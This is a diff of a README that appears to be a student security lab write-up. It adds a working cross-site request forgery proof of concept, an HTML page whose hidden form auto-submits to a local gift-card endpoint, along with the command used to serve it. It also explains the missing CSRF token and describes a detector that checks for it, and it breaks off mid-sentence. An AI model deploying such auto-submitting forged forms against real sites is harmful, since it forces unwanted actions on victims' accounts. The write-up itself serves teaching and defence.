@@ -43,6 +43,50 @@ For task 1b we made a script that uses the request libraries. The script works b
 <img width="1115" alt="Screen Shot 2022-03-17 at 9 02 14 PM" src="https://user-images.githubusercontent.com/72175659/158918270-119af53d-4eb6-49f8-83d4-c868f6ba5aef.png">
 
 # POC
- we successfully demonstrate a POC attack that works by exploiting the HTML POST method to submit a form with hidden values. We simply dropped the CRSF-POC.html file in the target browser. 
+ we successfully demonstrate a POC attack that works by exploiting the HTML POST method to submit a form with hidden values. We simply dropped the CRSF-POC.html file in the target browser. CSRF-POC.html
+ ```
+ <html>
+	<head>
+		<title>POC attack</title>
+	</head>
+	<body>
+		<h1>Pwn press F</h1>
+		<form action="http://127.0.0.1:80/gift/0" method="post" target="hiddenframe" name="csrfform">
+		
+		        <input type="hidden" name="amount" value="666" /> 
+			<input type="hidden" name="username" value="bryan" /> 
+			
+		 <script>document.csrfform.submit();</script>
+		</form>
+		<iframe name="hiddenframe" style="display: none;"></iframe>
+	</body>
+</html>
+
+ ```
+ 
+ <img width="1102" alt="Screen Shot 2022-03-18 at 3 44 40 PM" src="https://user-images.githubusercontent.com/72175659/159073383-5d4694e6-de9a-451e-8617-d6c755331e56.png">
+We store the POC exploit in an isolated directory and spin up a python server on port 8081 with
+
+```
+python3 -m http.server 8081
+```
+ We go on the targets web browser and go to 0.0.0.0:8081/index.html which will trigger out exploit. The instance of the exploit should gift the attacker a card worth 666
+ 
+ <img width="1101" alt="Screen Shot 2022-03-18 at 3 48 11 PM" src="https://user-images.githubusercontent.com/72175659/159073809-59a23af5-d43d-4649-b5e3-1b2b6c707539.png">
+ 
+ As expected our exploit was successful.
+
  
 <img width="1119" alt="Screen Shot 2022-03-17 at 9 33 30 PM" src="https://user-images.githubusercontent.com/72175659/158921791-69ec6bb5-a2e9-44bf-ba2c-f1438d2ab599.png">
+
+This exploit works because there is not csrf token in the input field. What this token does is essentially give a random hidden input that only that instance of the website will have and recognize on submission. This prevents cross websites forgeries to a large extent as guessing that input would require  time, luck, or both. We made jbrg-csrf to check for "{{ csrf_token() }}". The server outputs gift.html and since it doesn't have this mitigating control we output "CSRF Vulnerable"
+
+<img width="1099" alt="Screen Shot 2022-03-18 at 3 33 53 PM" src="https://user-images.githubusercontent.com/72175659/159072688-998d6189-a1ec-4a4a-aff0-b4ada363eead.png">
+
+When we add to the input brackets in gift.html 
+
+
+
+
+
+
